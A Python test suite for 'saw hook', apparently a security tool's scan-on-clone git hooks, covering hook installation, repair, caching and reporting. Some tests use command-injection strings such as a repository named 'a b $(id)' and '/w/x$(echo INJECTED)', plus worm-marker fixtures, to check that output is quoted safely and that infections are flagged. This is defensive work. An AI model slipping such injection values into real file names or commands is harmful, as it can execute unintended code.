#!/usr/bin/env python3
"""`saw hook` — scan-on-clone (#1195). Install/uninstall/status against an ISOLATED git global
config + XDG dirs, and the hook body's scope decisions, SHA cache, kill-switch, and — the
load-bearing one — that it scans with the OPERATOR's policy and NEVER a cloned repo's own config.
Everything is offline (a local git repo stands in for a clone)."""
from __future__ import annotations

import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security import hook, hook_outcome, hook_report, hookscript
from stayawake.bots.security.dependencies import db
from stayawake.bots.security.models import ScanResult
from tests.bots.security._osv_fixtures import mal_record, osv_zip

_INFECTED = "node_modules\ntemp_auto_push.bat\nbranch_structure.json\n"   # confirmed worm markers


def _run(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def _repo(files: dict[str, str]) -> Path:
    d = Path(tempfile.mkdtemp(prefix="hook-"))
    _run(d, "init", "-q")
    for cmd in (["config", "user.email", "t@t"], ["config", "user.name", "t"],
                ["config", "commit.gpgsign", "false"]):
        _run(d, *cmd)
    for rel, content in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    _run(d, "add", "-A")
    _run(d, "commit", "-qm", "init")
    return d


class _Isolated(unittest.TestCase):
    """Give each test its own HOME / XDG dirs and git global config so nothing touches the machine."""

    def setUp(self):
        self.home = Path(tempfile.mkdtemp(prefix="hook-home-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.home, ignore_errors=True))
        self.env = mock.patch.dict(os.environ, {
            "HOME": str(self.home),
            "XDG_CONFIG_HOME": str(self.home / ".config"),
            "XDG_CACHE_HOME": str(self.home / ".cache"),
            "XDG_STATE_HOME": str(self.home / ".local" / "state"),
            "GIT_CONFIG_GLOBAL": str(self.home / "gitconfig"),   # isolate `git config --global`
            "GIT_CONFIG_SYSTEM": os.devnull,
        })
        self.env.start()
        self.addCleanup(self.env.stop)
        os.environ.pop("SAW_HOOK_DISABLED", None)
        before_settings_hooks = mock.patch.object(hook, "git_runs_settings_hooks", return_value=False)
        before_settings_hooks.start()
        self.addCleanup(before_settings_hooks.stop)

    def _in_repo(self, repo: Path):
        cwd = os.getcwd()
        os.chdir(repo)
        self.addCleanup(lambda: os.chdir(cwd))


class TestEveryHookIsInstalledTheSameWay(_Isolated):
    """saw's hooks are one set: a conflict costs only the hook it is on, and a repository that
    already exists gets the whole set the way a new clone does."""

    def _existing(self, name="existing"):
        repo = self.home / name
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        return repo

    def _ours(self, repo, event):
        return hook.hookscript.is_ours(repo / ".git" / "hooks" / event)

    def test_a_named_existing_repository_gets_every_hook(self):
        repo = self._existing()
        self.assertEqual(hook.install(repositories=[str(repo)]), 0)
        for event in hook.hookscript.HOOKS:
            self.assertTrue(self._ours(repo, event), event)

    def test_an_existing_repositorys_own_hook_runs_after_saws(self):
        repo = self._existing()
        own = repo / ".git" / "hooks" / "pre-push"
        own.write_text("#!/bin/sh\nexit 0\n")
        os.chmod(own, 0o755)
        self.assertEqual(hook.install(repositories=[str(repo)]), 0)
        self.assertTrue(self._ours(repo, "pre-push"))
        self.assertEqual((repo / ".git" / "hooks" / "pre-push.local").read_text(), "#!/bin/sh\nexit 0\n")

    def test_a_repository_whose_hooks_run_from_elsewhere_is_left_and_named(self):
        repo = self._existing()
        subprocess.run(["git", "-C", str(repo), "config", "core.hooksPath", ".husky"], check=True)
        out = io.StringIO()
        with mock.patch.object(hook, "_tape", return_value=out):
            self.assertEqual(hook.install(repositories=[str(repo)]), 0)
        self.assertFalse(self._ours(repo, "pre-push"))
        self.assertFalse((repo / ".husky").exists(), "nothing is written where its hooks path points")
        self.assertIn(hook_outcome._shown([Path(os.path.realpath(repo))]), out.getvalue())

    def test_the_configured_local_targets_get_the_hooks(self):
        repo = self._existing()
        config = self.home / "security.yml"
        config.write_text(f"targets:\n  local:\n    - {repo}\n")
        self.assertEqual(hook.install(config_path=str(config)), 0)
        self.assertTrue(self._ours(repo, "pre-push"))

    def test_the_repository_it_runs_in_counts_only_when_asked(self):
        repo = self._existing()
        self._in_repo(repo)
        self.assertEqual(hook.install(), 0)
        self.assertFalse(self._ours(repo, "pre-push"))
        self.assertEqual(hook.install(standing_in=True), 0)
        self.assertTrue(self._ours(repo, "pre-push"))


class TestRepositoriesStayCurrentThroughTheirOwnOperations(_Isolated):
    """Every saw hook that runs brings its repository up to the full, current set, each hook from its
    own template; a repository's own hooks are never touched by an operation."""

    def setUp(self):
        super().setUp()
        self.repo = self.home / "existing"
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True)
        self.hooks = self.repo / ".git" / "hooks"
        self.assertEqual(hook.install(repositories=[str(self.repo)]), 0)
        self._in_repo(self.repo)

    def _operate(self, event="post-rewrite", argv=("amend",)):
        err = io.StringIO()
        with mock.patch.object(sys, "stderr", err):
            hook.run_event(event, list(argv))
        return err.getvalue()

    def test_a_missing_hook_comes_back_on_the_next_operation(self):
        (self.hooks / "pre-push").unlink()
        said = self._operate()
        self.assertTrue(hook.hookscript.is_ours(self.hooks / "pre-push"))
        self.assertIn("pre-push", said)

    def test_a_push_brings_the_other_hooks_back_too(self):
        (self.hooks / "post-merge").unlink()
        with mock.patch.object(hook.outbound, "check_push", return_value=0), \
                mock.patch.object(sys, "stdin", io.StringIO("")):
            self._operate("pre-push", ("origin", "url"))
        self.assertTrue(hook.hookscript.is_ours(self.hooks / "post-merge"))

    def test_a_stale_hook_is_upgraded_to_what_was_installed(self):
        (self.hooks / "pre-push").write_text(hook.hookscript.render("pre-push", "/old/saw", None))
        os.chmod(self.hooks / "pre-push", 0o755)
        self._operate()
        recorded = hook.hookscript.installed()
        self.assertEqual((self.hooks / "pre-push").read_text(),
                         hook.hookscript.render("pre-push", recorded[0], recorded[1]))

    def test_an_operation_never_touches_the_repositorys_own_hook(self):
        (self.hooks / "pre-push").write_text("#!/bin/sh\nexit 0\n")
        os.chmod(self.hooks / "pre-push", 0o755)
        self._operate()
        self.assertEqual((self.hooks / "pre-push").read_text(), "#!/bin/sh\nexit 0\n")
        self.assertFalse((self.hooks / "pre-push.local").exists())

    def test_an_operation_writes_nothing_where_the_hooks_path_points(self):
        subprocess.run(["git", "config", "core.hooksPath", ".husky"], check=True)
        self._operate()
        self.assertFalse((self.repo / ".husky").exists())


class TestTheHookReadsAResultAsTheScanDoes(_Isolated):

    def test_a_residue_result_is_never_called_clean(self):
        from stayawake.bots.security.models import RESIDUE, Finding, ScanResult, Severity
        repo = self.home / "cloned"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t",
                        "commit", "-q", "--allow-empty", "-m", "a"], check=True)
        self._in_repo(repo)
        left = Finding("cleanup-residue", "remediation-residue", Severity.LOW, "a.js", "left behind",
                       confidence=RESIDUE)
        err = io.StringIO()
        with mock.patch.object(hook, "_scan_within_budget",
                               return_value=ScanResult(target=str(repo), source="local", findings=[left])), \
                mock.patch.object(sys, "stderr", err):
            hook.run_event("post-checkout", ["0" * 40, "1" * 40, "1"])
        self.assertNotIn("scanned clean", err.getvalue())
        self.assertIn("would not carry", err.getvalue())


class TestInstallIsTheOneCentralPoint(_Isolated):

    def _existing(self, name):
        repo = self.home / name
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t",
                        "commit", "-q", "--allow-empty", "-m", "a"], check=True)
        return repo

    def test_install_brings_every_repository_it_knows_up_to_date(self):
        repo = self._existing("known")
        (repo / ".git" / "hooks").mkdir(exist_ok=True)
        sha = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True,
                             text=True, check=True).stdout.strip()
        hook._remember(repo, sha)
        self.assertEqual(hook.install(), 0)
        for event in hook.hookscript.HOOKS:
            self.assertTrue(hook.hookscript.is_ours(repo / ".git" / "hooks" / event), event)

    def test_one_repository_that_refuses_does_not_stop_the_others(self):
        refusing, fine = self._existing("refusing"), self._existing("fine")
        for name in ("post-merge", "post-merge.local"):
            (refusing / ".git" / "hooks" / name).write_text("#!/bin/sh\nexit 0\n")
            os.chmod(refusing / ".git" / "hooks" / name, 0o755)
        out = io.StringIO()
        with mock.patch.object(hook, "_tape", return_value=out):
            self.assertEqual(hook.install(repositories=[str(refusing), str(fine)]), 3)
        self.assertTrue(hook.hookscript.is_ours(fine / ".git" / "hooks" / "pre-push"))
        self.assertEqual((refusing / ".git" / "hooks" / "post-merge").read_text(), "#!/bin/sh\nexit 0\n")
        self.assertIn("refusing", out.getvalue())


class TestTheHookJudgesAsTheScanDoes(_Isolated):
    """The hook reaches the verdict `saw scan` reaches for the same repository."""

    def _repo_here(self, files):
        repo = _repo(files)
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        self._in_repo(repo)
        return repo

    def _head(self, repo):
        return subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True,
                              text=True, check=True).stdout.strip()

    def _clone_event(self, repo, **kw):
        with contextlib.redirect_stderr(io.StringIO()):
            return hook.run_event("post-checkout", ["0" * 40, self._head(repo), "1"], **kw)

    def test_every_pulled_file_is_scanned(self):
        repo = self._repo_here({"a.txt": "ok\n"})
        base = self._head(repo)
        (repo / "dép").mkdir()
        (repo / "dép" / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "pulled")
        (repo / ".git" / "ORIG_HEAD").write_text(base + "\n")
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(hook.run_event("post-merge", ["0"]), 1)

    def test_a_pull_git_cannot_describe_scans_the_whole_tree(self):
        repo = self._repo_here({"a.txt": "ok\n"})
        (repo / ".git" / "ORIG_HEAD").write_text(self._head(repo) + "\n")
        with mock.patch.object(hook, "stdout_bytes", return_value=None):
            self.assertEqual(hook._scan_scope("post-merge", ["0"], repo), (None, "pull"))

    def test_an_infection_is_reported_before_an_unreadable_file(self):
        from stayawake.bots.security.models import CONFIRMED, Finding, ScanResult, Severity
        repo = self._repo_here({"a.txt": "ok\n"})
        found = Finding("worm", "worm", Severity.CRITICAL, "a.txt", "worm", confidence=CONFIRMED)
        result = ScanResult(target=str(repo), source="local", findings=[found],
                            error="b.js could not be read")
        with mock.patch.object(hook, "_scan_within_budget", return_value=result):
            self.assertEqual(self._clone_event(repo), 1)

    def test_a_scan_that_hit_an_error_says_it_is_not_known_to_be_clean_and_what_to_run(self):
        from stayawake.bots.security.models import ScanResult
        repo = self._repo_here({"a.txt": "ok\n"})
        result = ScanResult(target=str(repo), source="local",
                            error="PermissionError: [Errno 13] Permission denied: '/kept/by/saw'")
        err = io.StringIO()
        with mock.patch.object(hook, "_scan_within_budget", return_value=result), \
             contextlib.redirect_stderr(err):
            code = hook.run_event("post-checkout", ["0" * 40, self._head(repo), "1"])
        self.assertEqual(code, 2)
        out = " ".join(err.getvalue().split())
        self.assertIn("not known to be clean", out)
        self.assertIn("saw scan", out)
        self.assertNotIn("/kept/by/saw", out)

    def test_a_repository_name_cannot_inject_into_the_line_or_the_command_to_run(self):
        from stayawake.bots.security.models import ScanResult
        parent = Path(tempfile.mkdtemp(prefix="hook-name-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(parent, ignore_errors=True))
        repo = parent / "a b $(id) ##[error]x"
        _repo({"a.txt": "ok\n"}).rename(repo)
        self._in_repo(repo)
        result = ScanResult(target=str(repo), source="local", error="b.js could not be read")
        err = io.StringIO()
        with mock.patch.object(hook, "_scan_within_budget", return_value=result), \
             contextlib.redirect_stderr(err):
            self.assertEqual(hook.run_event("post-checkout", ["0" * 40, self._head(repo), "1"]), 2)
        self.assertNotIn("##[", err.getvalue())
        command = [ln for ln in err.getvalue().splitlines() if "Scan it yourself:" in ln][0]
        self.assertRegex(command, r"saw scan '[^']*a b \$\(id\)[^']*'$")

    def test_an_infected_warning_quotes_the_commands_it_suggests(self):
        from stayawake.bots.security.models import ScanResult
        result = ScanResult(target="t", source="local")
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            hook._warn_infected("shown", hook.shlex.quote("/w/x$(echo INJECTED)"), result)
        self.assertIn("saw scan '/w/x$(echo INJECTED)'", err.getvalue())
        self.assertIn("saw fix --path '/w/x$(echo INJECTED)'", err.getvalue())

    def test_a_check_that_crashed_says_it_is_not_known_to_be_clean_without_its_exception(self):
        err = io.StringIO()
        with mock.patch.object(hook, "_run_event", side_effect=RuntimeError("\x1b[2Jboom")), \
             contextlib.redirect_stderr(err):
            self.assertEqual(hook.run_event("post-checkout", ["a", "b", "1"]), 2)
        self.assertIn("not known to be clean", err.getvalue())
        self.assertNotIn("boom", err.getvalue())

    def test_an_infected_repository_is_reported_on_every_clone(self):
        repo = self._repo_here({".gitignore": _INFECTED})
        self.assertEqual(self._clone_event(repo), 1)
        self.assertEqual(self._clone_event(repo), 1)

    def test_a_clean_scan_is_reused_only_under_the_same_policy(self):
        repo = self._repo_here({"a.txt": "ok\n"})
        real = hook._scan_within_budget
        scans = []

        def counted(*a, **kw):
            scans.append(a)
            return real(*a, **kw)

        config = self.home / "security.yml"
        config.write_text("allowlist:\n  - signature: gitignore-autopush-markers\n    path_glob: '**'\n")
        with mock.patch.object(hook, "_scan_within_budget", counted):
            self.assertEqual(self._clone_event(repo), 0)
            self.assertEqual(self._clone_event(repo), 0)
            self.assertEqual(len(scans), 1)
            self.assertEqual(self._clone_event(repo, config_path=str(config)), 0)
        self.assertEqual(len(scans), 2)

    def test_a_scanned_repository_is_still_one_repair_looks_after(self):
        repo = self._repo_here({".gitignore": _INFECTED})
        self._clone_event(repo)
        self.assertIn(os.path.realpath(repo), [str(r) for r in hook.hookscript.seeded_repositories()])


class TestGitRunsSawsScanFromItsSettings(_Isolated):
    """git 2.54 and later run hooks set in git's settings, whatever folder git runs hooks from."""

    def setUp(self):
        super().setUp()
        patched = mock.patch.object(hook, "git_runs_settings_hooks", return_value=True)
        patched.start()
        self.addCleanup(patched.stop)

    def _install(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            code = hook.install()
        return code, buf.getvalue()

    def _setting(self, *args):
        return subprocess.run(["git", "config", "--global", *args], capture_output=True, text=True).stdout

    def test_install_sets_saws_scan_for_each_event_once(self):
        self._install()
        self._install()
        for event in hook._HOOKS:
            self.assertIn("--from-settings " + event, self._setting("--get", f"hook.saw-{event}.command"))
            self.assertEqual(f"{event}\n", self._setting("--get-all", f"hook.saw-{event}.event"))

    def test_a_global_hooks_folder_is_still_named_beside_the_scan_in_the_settings(self):
        saw = self.home / "saw"
        saw.write_text("#!/bin/sh\n", encoding="utf-8")
        saw.chmod(0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(self.home / "hp")],
                            context=hook.gitutil.OPERATOR_CONFIG)
        with mock.patch.object(hook, "_saw_executable", return_value=str(saw)):
            code, out = self._install()
        self.assertEqual(code, 3, out)
        self.assertIn("will not run", out)
        self.assertIn("in your git settings still runs", out)
        self.assertNotIn("update git", out)

    def test_one_switched_off_in_the_settings_is_left_off(self):
        hook.gitutil.run_ok(None, ["config", "--global", "hook.saw-pre-push.enabled", "false"],
                            context=hook.gitutil.OPERATOR_CONFIG)
        self._install()
        self.assertEqual("", self._setting("--get", "hook.saw-pre-push.command"))
        self.assertEqual("false\n", self._setting("--get", "hook.saw-pre-push.enabled"))

    def test_a_settings_hook_left_off_is_not_a_change_on_the_next_run(self):
        hook.gitutil.run_ok(None, ["config", "--global", "hook.saw-pre-push.enabled", "false"],
                            context=hook.gitutil.OPERATOR_CONFIG)
        hook.settle_hooks()
        self.assertFalse(hook.settle_hooks().changed)

    def test_uninstall_names_a_settings_hook_it_could_not_take_out(self):
        self._install()
        real_run_ok = hook.gitutil.run_ok
        with mock.patch.object(hook.gitutil, "run_ok", side_effect=lambda repo, args, **k:
                               False if "--remove-section" in args else real_run_ok(repo, args, **k)):
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                code = hook.uninstall()
        self.assertEqual(3, code)
        self.assertIn("is still set in your git settings", buf.getvalue())
        self.assertIsNotNone(hookscript.installed())

    def test_uninstall_takes_them_out(self):
        self._install()
        hook.uninstall()
        self.assertEqual("", self._setting("--get-regexp", r"^hook\.saw-"))

    def test_both_runs_check_and_a_clean_full_scan_is_not_repeated_for_the_same_commit(self):
        repo = self.home / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q",
                        "--allow-empty", "-m", "one"], check=True)
        self._in_repo(repo)
        clone = ["0" * 40, "1" * 40, "1"]
        clean = mock.Mock(infected=False, error=None, suspicious=False, residue=False, findings=[])
        with mock.patch.object(hook, "_scan_within_budget", return_value=clean) as scanned, \
                mock.patch.object(hook, "_bring_up_to_date"):
            hook.run_event("post-checkout", clone, from_settings=True, no_stream=True)
            self.assertNotIn(os.path.realpath(repo), hook._load_cache())
            hook.run_event("post-checkout", clone, no_stream=True)
            self.assertEqual(1, scanned.call_count)
            subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", "commit",
                            "-q", "--allow-empty", "-m", "two"], check=True)
            hook.run_event("post-checkout", clone, no_stream=True)
            self.assertEqual(2, scanned.call_count)

    def test_a_folder_run_after_a_settings_run_still_keeps_the_repository_current(self):
        repo = self.home / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        self._in_repo(repo)
        args = ["0" * 40, "1" * 40, "1"]
        with mock.patch.object(hook, "_scan_scope", return_value=(None, None)), \
                mock.patch.object(hook, "_bring_up_to_date") as updated:
            hook.run_event("post-checkout", args, from_settings=True, no_stream=True)
            hook.run_event("post-checkout", args, no_stream=True)
        updated.assert_called_once()

    def test_a_settings_hook_run_leaves_the_repositorys_hooks_and_the_seeded_list_alone(self):
        repo = self.home / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        self._in_repo(repo)
        subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q",
                        "--allow-empty", "-m", "one"], check=True)
        clean = mock.Mock(infected=False, error=None, suspicious=False, residue=False, findings=[])
        with mock.patch.object(hook, "_bring_up_to_date") as updated, \
                mock.patch.object(hook, "_remember") as remembered, \
                mock.patch.object(hook, "_scan_within_budget", return_value=clean):
            hook.run_event("post-checkout", ["0" * 40, "1" * 40, "1"], from_settings=True, no_stream=True)
            hook.run_event("pre-push", ["origin", "x"], from_settings=True, no_stream=True)
        updated.assert_not_called()
        remembered.assert_not_called()

    def test_a_switched_off_event_or_a_saw_that_cannot_run_is_not_called_set(self):
        saw = self.home / "saw"
        saw.write_text("#!/bin/sh\n", encoding="utf-8")
        saw.chmod(0o755)
        with mock.patch.object(hook, "_saw_executable", return_value=str(saw)):
            self._install()
        self.assertTrue(hook._settings_hooks_set())
        hook.gitutil.run_ok(None, ["config", "--global", "hook.post-checkout.enabled", "false"],
                            context=hook.gitutil.OPERATOR_CONFIG)
        self.assertFalse(hook._settings_hooks_set())
        hook.gitutil.run_ok(None, ["config", "--global", "--unset", "hook.post-checkout.enabled"],
                            context=hook.gitutil.OPERATOR_CONFIG)
        self.assertTrue(hook._settings_hooks_set())
        saw.unlink()
        saw.mkdir()
        self.assertFalse(hook._settings_hooks_set())

    def test_a_missing_saw_or_one_that_is_a_folder_is_quiet(self):
        repo = self.home / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        (self.home / "a-folder").mkdir()
        for saw in (self.home / "no-such-saw", self.home / "a-folder"):
            command = hookscript.settings_command("post-checkout", str(saw), None)
            done = subprocess.run(["sh", "-c", command + ' "$@"', command, "0" * 40, "1" * 40, "1"],
                                  cwd=repo, capture_output=True)
            self.assertEqual((0, b""), (done.returncode, done.stderr), saw)

    def test_settings_that_cannot_be_written_leave_the_install_settled(self):
        with mock.patch.object(hook.gitutil, "run_ok", side_effect=lambda repo, args, **k:
                               not (args[:2] == ["config", "--global"] and args[2].startswith(("hook.", "--replace-all")))
                               and subprocess.run(["git", *args], capture_output=True).returncode == 0):
            done = hook.settle_hooks()
        self.assertTrue(done.settled, [a for a in done.actions if a.state not in hook._SETTLED])
        self.assertIn(hook.NOTED, [a.state for a in done.actions if str(a.path).startswith("hook.saw-")])

    def test_the_settings_hook_never_fails_git(self):
        repo = self.home / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        failing = self.home / "failing-saw"
        failing.write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
        failing.chmod(0o755)
        command = hookscript.settings_command("post-checkout", str(failing), None)
        done = subprocess.run(["sh", "-c", command + ' "$@"', command, "0" * 40, "1" * 40, "1"],
                              cwd=repo, capture_output=True)
        self.assertEqual(0, done.returncode)


class TestSawsHooksGoInTheHooksFolder(_Isolated):
    """A folder git runs every repository's hooks from gets saw's hooks when it is the operator's alone."""

    def setUp(self):
        super().setUp()
        self.folder = self.home / "githooks"
        self.folder.mkdir()
        self.folder.chmod(0o755)
        self._point_at(self.folder)

    def _point_at(self, folder):
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(folder)],
                            context=hook.gitutil.OPERATOR_CONFIG)

    def _install(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            code = hook.install()
        return code, buf.getvalue()

    def _yours(self, name="pre-push"):
        (self.folder / name).write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        (self.folder / name).chmod(0o755)

    def test_install_puts_saws_hooks_there_and_keeps_yours(self):
        self._yours()
        code, out = self._install()
        self.assertEqual(0, code, out)
        for event in hook._HOOKS:
            self.assertTrue(hookscript.is_ours(self.folder / event), event)
        self.assertTrue((self.folder / "pre-push.local").exists())
        self.assertNotIn("will not run", out)

    def test_repair_keeps_it_and_uninstall_puts_the_folder_back_as_it_was(self):
        self._yours()
        self._install()
        (self.folder / "post-merge").unlink()
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(0, hook.repair())
        self.assertTrue(hookscript.is_ours(self.folder / "post-merge"))
        with contextlib.redirect_stdout(io.StringIO()):
            hook.uninstall()
        self.assertEqual(["pre-push"], sorted(p.name for p in self.folder.iterdir()))

    def test_a_folder_others_can_write_a_link_or_one_in_a_repository_is_left(self):
        self.folder.chmod(0o777)
        code, out = self._install()
        self.assertIn("can be written by others", out)
        self.assertFalse((self.folder / "post-checkout").exists())
        self.folder.chmod(0o755)
        tree = self.home / "dotfiles"
        subprocess.run(["git", "init", "-q", str(tree)], check=True)
        (tree / "githooks").mkdir()
        self._point_at(tree / "githooks")
        code, out = self._install()
        self.assertIn("inside a git", out)
        self.assertFalse((tree / "githooks" / "post-checkout").exists())
        with open(tree / ".git" / "config", "a", encoding="utf-8") as fh:
            fh.write("[core]\n\trepositoryformatversion = 1\n[extensions]\n\tnoSuchExtension = true\n")
        code, out = self._install()
        self.assertFalse((tree / "githooks" / "post-checkout").exists())
        link = self.home / "linked-hooks"
        link.symlink_to(self.folder)
        self._point_at(link)
        code, out = self._install()
        self.assertIn("is a link", out)
        self.assertFalse((self.folder / "post-checkout").exists())

    def test_repair_writes_nothing_once_the_folder_is_no_longer_the_operators_alone(self):
        self._install()
        (self.folder / "post-merge").unlink()
        subprocess.run(["git", "init", "-q", str(self.folder)], check=True)
        with contextlib.redirect_stdout(io.StringIO()):
            hook.repair()
        self.assertFalse((self.folder / "post-merge").exists())

    def test_a_folder_saw_wrote_into_is_never_forgotten_and_uninstall_cleans_it(self):
        self._yours("post-merge")
        self._install()
        self.folder.chmod(0o777)
        self._install()
        self.folder.chmod(0o755)
        self.assertEqual([self.folder], hookscript.installed_hooks_folders())
        with contextlib.redirect_stdout(io.StringIO()):
            hook.uninstall()
        self.assertEqual(["post-merge"], sorted(p.name for p in self.folder.iterdir()))


class TestInstallUninstall(_Isolated):
    def _global_template(self):
        return hook.gitutil.stdout(None, ["config", "--global", "--get", "init.templateDir"], context=hook.gitutil.OPERATOR_CONFIG).strip()

    def test_an_older_git_is_told_to_update(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            hook.install()
        self.assertIn("update git to 2.54 or later", buf.getvalue())

    def test_install_sets_templatedir_and_writes_executable_hooks(self):
        self.assertEqual(hook.install(), 0)
        self.assertEqual(self._global_template(), str(hook.template_dir()))
        for name in ("post-checkout", "post-merge"):
            f = hook._hooks_dir() / name
            self.assertTrue(f.exists() and os.access(f, os.X_OK), name)
            self.assertIn(hook._MARKER, f.read_text())

    def test_no_stream_turns_install_progress_off(self):
        with mock.patch.object(hook, "busy") as spinning, \
             mock.patch.object(hook, "settle_hooks",
                               return_value=hook.Settling(problem="stopped", code=2)):
            spinning.return_value.__enter__ = mock.Mock()
            spinning.return_value.__exit__ = mock.Mock(return_value=False)
            hook.install(no_stream=True)
        self.assertTrue(spinning.call_args.kwargs.get("no_stream"))

    def test_status_reflects_install(self):
        hook.install()
        # status just prints + returns 0; assert it detects our hooks as installed.
        self.assertTrue([e for e in hook._HOOKS if hook._is_ours(hook._hooks_dir() / e)])
        self.assertEqual(hook.status(), 0)

    def test_uninstall_unsets_and_removes(self):
        hook.install()
        self.assertEqual(hook.uninstall(), 0)
        self.assertEqual(self._global_template(), "")
        self.assertFalse((hook._hooks_dir() / "post-checkout").exists())

    def test_reinstall_is_idempotent(self):
        hook.install()
        self.assertEqual(hook.install(), 0)                       # no HookError, no duplicate
        self.assertEqual(self._global_template(), str(hook.template_dir()))

    def test_missing_config_is_rejected(self):
        self.assertEqual(hook.install(config_path="/no/such/config.yml"), 2)

    def test_install_warns_on_conflicting_global_hookspath(self):
        # A global core.hooksPath makes git ignore .git/hooks — our template hooks would silently
        # never run. Install must WARN, not report a false success.
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(self.home / "hp")], context=hook.gitutil.OPERATOR_CONFIG)
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            self.assertEqual(hook.install(), 3)
        self.assertIn(str(self.home / "hp"), buf.getvalue())
        self.assertIn("will not run", buf.getvalue())
        self.assertNotIn("✓ scan-on-clone installed", buf.getvalue())


class TestTheHooksSettingIsReadAsGitUsesIt(_Isolated):
    def _install(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            code = hook.install()
        return code, buf.getvalue()

    def test_a_setting_brought_in_by_an_include_is_seen(self):
        extra = self.home / "extra.gitconfig"
        extra.write_text(f"[core]\n\thooksPath = {self.home / 'hp'}\n")
        (self.home / "gitconfig").write_text(f"[include]\n\tpath = {extra}\n")
        code, out = self._install()
        self.assertEqual(code, 3)
        self.assertIn("will not run", out)
        self.assertNotIn("✓ scan-on-clone installed", out)

    def test_a_setting_in_the_system_configuration_is_seen(self):
        system = self.home / "system.gitconfig"
        system.write_text(f"[core]\n\thooksPath = {self.home / 'hp'}\n")
        with mock.patch.dict(os.environ, {"GIT_CONFIG_SYSTEM": str(system)}):
            code, out = self._install()
        self.assertEqual(code, 3)
        self.assertNotIn("✓ scan-on-clone installed", out)

    def test_a_setting_that_cannot_be_read_is_not_verified(self):
        real = hook.gitutil.run

        def failing(repo, args, **kw):
            if "core.hooksPath" in args and "--get-all" in args:
                return None
            return real(repo, args, **kw)
        with mock.patch.object(hook.gitutil, "run", failing):
            code, out = self._install()
        self.assertEqual(code, 3)
        self.assertIn("it is not known whether new clones are scanned", out)
        self.assertNotIn("✓ scan-on-clone installed", out)

    def test_a_setting_from_the_environment_is_seen(self):
        hp = str(self.home / "hp")
        for env in ({"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "core.hooksPath",
                     "GIT_CONFIG_VALUE_0": hp},
                    {"GIT_CONFIG_COUNT": "2", "GIT_CONFIG_KEY_0": "user.name",
                     "GIT_CONFIG_VALUE_0": "x", "GIT_CONFIG_KEY_1": "CORE.HOOKSPATH",
                     "GIT_CONFIG_VALUE_1": hp},
                    {"GIT_CONFIG_PARAMETERS": f"'core.hooksPath={hp}'"},
                    {"GIT_CONFIG_COUNT": "not a number"}):
            with self.subTest(env=sorted(env)):
                with mock.patch.dict(os.environ, env):
                    code, out = self._install()
                self.assertEqual(code, 3)
                self.assertNotIn("✓ scan-on-clone installed", out)

    def test_an_empty_or_multi_line_setting_is_not_mistaken_for_none(self):
        for value in ("", '"/a\\nb"'):
            with self.subTest(value=value):
                (self.home / "gitconfig").write_text(f"[core]\n\thooksPath = {value}\n")
                code, out = self._install()
                self.assertEqual(code, 3)
                self.assertNotIn("✓ scan-on-clone installed", out)
                self.assertIn("will not run", out)

    def test_a_repository_set_to_run_hooks_from_nowhere_gets_nothing_in_its_working_tree(self):
        repo = self.home / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", ""],
                            context=hook.gitutil.OPERATOR_CONFIG)
        done = hook.settle_hooks(repositories=[repo])
        self.assertEqual([".git"], sorted(p.name for p in repo.iterdir()))
        self.assertIn(hook.LEFT, [a.state for a in done.actions if a.path == repo])

    def test_a_template_folder_brought_in_by_an_include_is_used_not_replaced(self):
        mine = self.home / "my-template"
        extra = self.home / "extra.gitconfig"
        extra.write_text(f"[init]\n\ttemplateDir = {mine}\n")
        (self.home / "gitconfig").write_text(f"[include]\n\tpath = {extra}\n")
        self._install()
        self.assertTrue((mine / "hooks" / "post-checkout").exists())
        self.assertNotIn("templateDir", (self.home / "gitconfig").read_text())

    def test_a_template_folder_this_shell_sets_is_named_and_not_called_installed(self):
        with mock.patch.dict(os.environ, {"GIT_TEMPLATE_DIR": str(self.home / "env-template")}):
            code, out = self._install()
        self.assertEqual(code, 3)
